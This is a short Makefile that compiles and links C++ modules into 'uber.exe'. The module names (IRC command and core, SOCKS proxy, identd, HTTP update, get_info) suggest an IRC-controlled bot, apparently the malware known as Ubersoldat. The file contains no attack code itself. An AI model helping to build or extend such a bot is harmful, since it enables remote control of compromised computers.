all:
	@erase *.o
	gcc -Os -c ubersoldat.cpp
	gcc -Os -c toolz.cpp
	gcc -Os -c dns.cpp
	gcc -Os -c globals.cpp
	gcc -Os -c http_get.cpp
	gcc -Os -c http_log.cpp
	gcc -Os -c http_update.cpp
	gcc -Os -c identd.cpp
	gcc -Os -c irc_commands.cpp
	gcc -Os -c irc_core.cpp
	gcc -Os -c misc.cpp
	gcc -Os -c misc_inet.cpp
	gcc -Os -c socket.cpp
	gcc -Os -c socks_core.cpp
	gcc -Os -c StdAfx.cpp
	gcc -Os -c get_info.cpp
	gcc -Os wininet.lib Ws2_32.lib kernel32.lib user32.lib ubersoldat.o toolz.o dns.o globals.o http_get.o http_log.o http_update.o identd.o irc_commands.o irc_core.o \
		misc.o misc_inet.o socket.o socks_core.o StdAfx.o get_info.o -o uber.exe 